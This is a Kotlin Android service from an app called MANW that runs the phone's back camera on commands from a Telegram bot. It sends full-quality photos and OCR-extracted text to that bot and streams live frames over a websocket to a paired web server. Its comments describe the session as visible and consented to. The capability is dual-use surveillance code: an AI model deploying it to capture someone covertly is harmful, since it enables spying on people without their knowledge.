package com.manw.autosender

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Bitmap
import android.util.Base64
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.IBinder
import androidx.camera.core.CameraSelector
import androidx.camera.core.CameraControl
import androidx.camera.core.FocusMeteringAction
import androidx.camera.core.ImageAnalysis
import androidx.camera.core.ImageProxy
import androidx.camera.core.SurfaceOrientedMeteringPointFactory
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.core.ImageCapture.OutputFileOptions
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import com.google.android.gms.tasks.Tasks
import com.google.mlkit.vision.common.InputImage
import com.google.mlkit.vision.text.TextRecognition
import com.google.mlkit.vision.text.latin.TextRecognizerOptions
import okhttp3.FormBody
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import okhttp3.RequestBody.Companion.asRequestBody
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Visible, user-approved camera session. Started only from CameraActivity while it is visible.
 * The persistent notification makes camera use explicit; Android may still stop the service.
 */
class CameraSessionService : Service(), LifecycleOwner {
    private val serviceLifecycle = LifecycleRegistry(this)
    override val lifecycle: Lifecycle get() = serviceLifecycle
    companion object {
        const val ACTION_START = "com.manw.autosender.CAMERA_SESSION_START"
        private const val CHANNEL_ID = "manw_camera_session"
        private const val NOTIFICATION_ID = 3111
    }

    @Volatile private var imageCapture: ImageCapture? = null
    @Volatile private var cameraControl: CameraControl? = null
    private val analysisExecutor = Executors.newSingleThreadExecutor()
    private val analyzing = AtomicBoolean(false)
    @Volatile private var lastAutoFocusAt = 0L
    @Volatile private var sending = false
    @Volatile private var streamSocket: WebSocket? = null
    private val streamConnecting = AtomicBoolean(false)
    @Volatile private var lastStreamFrameAt = 0L
    private var receiverRegistered = false

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            when (intent?.action) {
                ImageMonitorService.ACTION_REMOTE_CAPTURE -> captureAndSend()
                ImageMonitorService.ACTION_REMOTE_STOP -> {
                    stopCamera("تم إيقاف جلسة الكاميرا بأمر من البوت.")
                    stopSelf()
                }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        serviceLifecycle.handleLifecycleEvent(Lifecycle.Event.ON_CREATE)
        createChannel()
        val notification = buildNotification("الكاميرا تعمل بعد موافقتك. أرسل /capture للتصوير أو /stopcamera للإيقاف.")
        if (Build.VERSION.SDK_INT >= 29) {
            ServiceCompat.startForeground(this, NOTIFICATION_ID, notification,
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
        val filter = IntentFilter().apply {
            addAction(ImageMonitorService.ACTION_REMOTE_CAPTURE)
            addAction(ImageMonitorService.ACTION_REMOTE_STOP)
        }
        if (Build.VERSION.SDK_INT >= 33) registerReceiver(commandReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        else @Suppress("DEPRECATION") registerReceiver(commandReceiver, filter)
        receiverRegistered = true
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        serviceLifecycle.handleLifecycleEvent(Lifecycle.Event.ON_START)
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            sendStatus("لم تبدأ جلسة الكاميرا: إذن الكاميرا غير ممنوح.")
            stopSelf()
            return START_NOT_STICKY
        }
        if (imageCapture == null) startCamera()
        return Service.START_STICKY
    }

    private fun startCamera() {
        val future = ProcessCameraProvider.getInstance(this)
        future.addListener({
            try {
                val provider = future.get()
                val capture = ImageCapture.Builder()
                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MAXIMIZE_QUALITY)
                    .setJpegQuality(100)
                    .build()
                val analysis = ImageAnalysis.Builder()
                    .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                    .build()
                analysis.setAnalyzer(analysisExecutor) { proxy -> analyzeForTextAndFocus(proxy) }
                provider.unbindAll()
                val camera = provider.bindToLifecycle(this, CameraSelector.DEFAULT_BACK_CAMERA, capture, analysis)
                cameraControl = camera.cameraControl
                imageCapture = capture
                connectLiveStream()
                SecurePrefs.get(this).edit().putBoolean("camera_active", true).apply()
                updateNotification("جلسة الكاميرا نشطة بموافقتك. أرسل /capture لالتقاط صورة.")
                sendStatus("تم تشغيل جلسة الكاميرا في الخلفية بموافقتك. أرسل /capture للتصوير أو /stopcamera للإيقاف.")
            } catch (e: Exception) {
                sendStatus("تعذر تشغيل الكاميرا: " + (e.message ?: "خطأ غير معروف"))
                stopSelf()
            }
        }, ContextCompat.getMainExecutor(this))
    }


    private fun connectLiveStream() {
        val prefs = SecurePrefs.get(this)
        if (!prefs.getBoolean("web_paired", false) || !streamConnecting.compareAndSet(false, true)) return
        val base = prefs.getString("web_base_url", "").orEmpty()
        val token = prefs.getString("web_device_token", "").orEmpty()
        if (base.isBlank() || token.isBlank()) { streamConnecting.set(false); return }
        try {
            val wsBase = base.replaceFirst("https://", "wss://").replaceFirst("http://", "ws://")
            val request = Request.Builder().url("$wsBase/ws/device?device=${java.net.URLEncoder.encode(token, "UTF-8")}").build()
            streamSocket = OkHttpClient.Builder().pingInterval(20, TimeUnit.SECONDS).build()
                .newWebSocket(request, object : WebSocketListener() {
                    override fun onOpen(webSocket: WebSocket, response: okhttp3.Response) {
                        streamConnecting.set(false)
                        webSocket.send(JSONObject().put("type", "status").put("cameraActive", true).toString())
                    }
                    override fun onFailure(webSocket: WebSocket, t: Throwable, response: okhttp3.Response?) {
                        if (streamSocket === webSocket) streamSocket = null
                        streamConnecting.set(false)
                        sendStatus("انقطع اتصال البث بالموقع. أعد تشغيل جلسة الكاميرا لإعادة الاتصال.")
                    }
                    override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                        if (streamSocket === webSocket) streamSocket = null
                        streamConnecting.set(false)
                    }
                })
        } catch (_: Exception) { streamConnecting.set(false) }
    }

    private fun publishLiveFrame(proxy: ImageProxy) {
        val now = System.currentTimeMillis()
        if (now - lastStreamFrameAt < 250L) return
        lastStreamFrameAt = now
        var bitmap: Bitmap? = null
        try {
            if (streamSocket == null) connectLiveStream()
            val socket = streamSocket ?: return
            bitmap = proxy.toBitmap()
            val maxWidth = 720
            val scaled = if (bitmap.width > maxWidth) {
                val height = (bitmap.height * (maxWidth.toFloat() / bitmap.width)).toInt().coerceAtLeast(1)
                Bitmap.createScaledBitmap(bitmap, maxWidth, height, true)
            } else bitmap
            val output = java.io.ByteArrayOutputStream()
            scaled.compress(Bitmap.CompressFormat.JPEG, 58, output)
            if (scaled !== bitmap) scaled.recycle()
            val payload = JSONObject().put("type", "frame")
                .put("jpeg", Base64.encodeToString(output.toByteArray(), Base64.NO_WRAP)).toString()
            socket.send(payload)
        } catch (_: Exception) {
            streamSocket?.close(1011, "frame encode failed")
            streamSocket = null
        } finally {
            bitmap?.recycle()
        }
    }

    /**
     * Detect text in camera frames and meter autofocus/exposure on its center,
     * equivalent to automatically tapping the text on the camera preview.
     */
    private fun analyzeForTextAndFocus(proxy: ImageProxy) {
        publishLiveFrame(proxy)
        val mediaImage = proxy.image
        if (mediaImage == null || !analyzing.compareAndSet(false, true)) {
            proxy.close()
            return
        }
        if (System.currentTimeMillis() - lastAutoFocusAt < 2500L) {
            analyzing.set(false)
            proxy.close()
            return
        }
        val input = try {
            InputImage.fromMediaImage(mediaImage, proxy.imageInfo.rotationDegrees)
        } catch (_: Exception) {
            analyzing.set(false)
            proxy.close()
            return
        }
        val recognizer = TextRecognition.getClient(TextRecognizerOptions.DEFAULT_OPTIONS)
        recognizer.process(input)
            .addOnSuccessListener { result ->
                val rect = result.textBlocks
                    .maxByOrNull { block ->
                        val box = block.boundingBox
                        if (box == null) 0L else box.width().toLong() * box.height().toLong()
                    }?.boundingBox
                if (rect != null && rect.width() > 0 && rect.height() > 0) {
                    val rotation = proxy.imageInfo.rotationDegrees
                    val w = if (rotation == 90 || rotation == 270) proxy.height.toFloat() else proxy.width.toFloat()
                    val h = if (rotation == 90 || rotation == 270) proxy.width.toFloat() else proxy.height.toFloat()
                    try {
                        val point = SurfaceOrientedMeteringPointFactory(w, h)
                            .createPoint(rect.exactCenterX().coerceIn(0f, w), rect.exactCenterY().coerceIn(0f, h))
                        val action = FocusMeteringAction.Builder(
                            point, FocusMeteringAction.FLAG_AF or FocusMeteringAction.FLAG_AE
                        ).setAutoCancelDuration(3, TimeUnit.SECONDS).build()
                        cameraControl?.startFocusAndMetering(action)
                        lastAutoFocusAt = System.currentTimeMillis()
                    } catch (_: Exception) { }
                }
            }
            .addOnCompleteListener {
                recognizer.close()
                analyzing.set(false)
                proxy.close()
            }
    }

    private fun captureAndSend() {
        val capture = imageCapture
        if (capture == null) {
            sendStatus("جلسة الكاميرا غير نشطة. افتح إشعار /camera ووافق على بدء الكاميرا.")
            return
        }
        if (sending) {
            sendStatus("هناك صورة قيد الالتقاط أو الإرسال بالفعل.")
            return
        }
        sending = true
        updateNotification("جاري التقاط الصورة وإرسالها إلى تيليجرام…")
        val original = File(cacheDir, "MANW_REMOTE_" + System.currentTimeMillis() + ".jpg")
        capture.takePicture(OutputFileOptions.Builder(original).build(),
            ContextCompat.getMainExecutor(this), object : ImageCapture.OnImageSavedCallback {
                override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                    Thread {
                        val enhanced = File(cacheDir, "MANW_CLEAR_" + System.currentTimeMillis() + ".jpg")
                        val enhancedReady = try {
                            ImageClarity.createReadableCopy(original, enhanced)
                            true
                        } catch (_: Exception) { false }
                        val originalResult = uploadPhoto(original, "الصورة الأصلية")
                        val enhancedResult = if (enhancedReady) uploadPhoto(enhanced, "نسخة محسّنة للوضوح والقراءة") else Pair(false, "تعذر إنشاء النسخة المحسّنة")
                        val prefs = SecurePrefs.get(this@CameraSessionService)
                        if (prefs.getBoolean("web_paired", false)) {
                            val base = prefs.getString("web_base_url", "").orEmpty()
                            val deviceToken = prefs.getString("web_device_token", "").orEmpty()
                            try {
                                WebControlClient.upload(base, deviceToken, original, "MANW_ORIGINAL_" + original.name)
                                if (enhancedReady) WebControlClient.upload(base, deviceToken, enhanced, "MANW_CLEAR_" + enhanced.name)
                            } catch (_: Exception) { }
                        }
                        val recognized = if (enhancedReady) try { extractReadableText(enhanced) } catch (_: Exception) { "" } else ""
                        if (recognized.isNotBlank()) sendRecognizedText(recognized)
                        val allSent = originalResult.first && (!enhancedReady || enhancedResult.first)
                        if (allSent) {
                            original.delete()
                            enhanced.delete()
                            sendStatus("تم التصوير وإرسال الصورة الأصلية والنسخة المحسّنة إلى تيليجرام." +
                                if (recognized.isNotBlank()) " وتم استخراج النص." else " لم يتم العثور على نص واضح.")
                        } else {
                            val reason = if (!originalResult.first) originalResult.second else enhancedResult.second
                            sendStatus("التقطت الصورة لكن تعذر إرسال كل النسخ. $reason")
                        }
                        sending = false
                        updateNotification("جلسة الكاميرا نشطة. أرسل /capture للتصوير أو /stopcamera للإيقاف.")
                    }.start()
                }
                override fun onError(exception: ImageCaptureException) {
                    sending = false
                    sendStatus("تعذر التقاط الصورة: " + (exception.message ?: "خطأ"))
                    updateNotification("جلسة الكاميرا نشطة. أرسل /capture لإعادة المحاولة.")
                }
            })
    }

    private fun uploadPhoto(file: File, caption: String): Pair<Boolean, String> {
        val prefs = SecurePrefs.get(this)
        val token = prefs.getString("bot_token", "") ?: ""
        val chatId = prefs.getString("chat_id", "") ?: ""
        if (token.isBlank() || chatId.isBlank()) return Pair(false, "بيانات البوت غير مكتملة")
        return try {
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaType()))
                .addFormDataPart("caption", caption).build()
            val request = Request.Builder().url("https://api.telegram.org/bot" + token + "/sendPhoto").post(body).build()
            OkHttpClient.Builder().callTimeout(90, TimeUnit.SECONDS).build().newCall(request).execute().use { response ->
                val json = JSONObject(response.body?.string().orEmpty())
                val ok = response.isSuccessful && json.optBoolean("ok")
                Pair(ok, if (ok) "ok" else json.optString("description", "HTTP " + response.code))
            }
        } catch (e: Exception) { Pair(false, e.message ?: "خطأ اتصال") }
    }

    private fun extractReadableText(file: File): String {
        val recognizer = TextRecognition.getClient(TextRecognizerOptions.DEFAULT_OPTIONS)
        return try {
            val image = InputImage.fromFilePath(this, Uri.fromFile(file))
            Tasks.await(recognizer.process(image)).text.trim().take(3500)
        } finally { recognizer.close() }
    }

    private fun sendRecognizedText(text: String) {
        val prefs = SecurePrefs.get(this)
        val token = prefs.getString("bot_token", "") ?: ""
        val chatId = prefs.getString("chat_id", "") ?: ""
        if (token.isBlank() || chatId.isBlank()) return
        try {
            val body = FormBody.Builder().add("chat_id", chatId)
                .add("text", "النص المستخرج آلياً من الصورة (قد يحتاج مراجعة):\n" + text.take(3500)).build()
            val request = Request.Builder().url("https://api.telegram.org/bot" + token + "/sendMessage").post(body).build()
            OkHttpClient().newCall(request).execute().close()
        } catch (_: Exception) { }
    }

    private fun sendStatus(message: String) {
        val prefs = SecurePrefs.get(this)
        val token = prefs.getString("bot_token", "") ?: ""
        val chatId = prefs.getString("chat_id", "") ?: ""
        if (token.isBlank() || chatId.isBlank()) return
        Thread {
            try {
                val body = FormBody.Builder().add("chat_id", chatId).add("text", message).build()
                val request = Request.Builder().url("https://api.telegram.org/bot" + token + "/sendMessage").post(body).build()
                OkHttpClient().newCall(request).execute().close()
            } catch (_: Exception) { }
        }.start()
    }

    private fun stopCamera(message: String) {
        streamSocket?.close(1000, "camera stopped")
        streamSocket = null
        ProcessCameraProvider.getInstance(this).get().unbindAll()
        imageCapture = null
        SecurePrefs.get(this).edit().putBoolean("camera_active", false).apply()
        sendStatus(message)
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            val channel = NotificationChannel(CHANNEL_ID, "جلسة الكاميرا", NotificationManager.IMPORTANCE_LOW)
            channel.description = "إشعار دائم ومرئي أثناء تشغيل الكاميرا بموافقة المستخدم"
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun buildNotification(message: String): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setContentTitle("MANW — الكاميرا نشطة")
            .setContentText(message)
            .setOngoing(true)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

    private fun updateNotification(message: String) {
        (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
            .notify(NOTIFICATION_ID, buildNotification(message))
    }

    override fun onDestroy() {
        streamSocket?.close(1000, "service stopped")
        streamSocket = null
        try { ProcessCameraProvider.getInstance(this).get().unbindAll() } catch (_: Exception) { }
        imageCapture = null
        cameraControl = null
        SecurePrefs.get(this).edit().putBoolean("camera_active", false).apply()
        analysisExecutor.shutdown()
        if (receiverRegistered) {
            try { unregisterReceiver(commandReceiver) } catch (_: Exception) { }
            receiverRegistered = false
        }
        serviceLifecycle.handleLifecycleEvent(Lifecycle.Event.ON_STOP)
        serviceLifecycle.handleLifecycleEvent(Lifecycle.Event.ON_DESTROY)
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
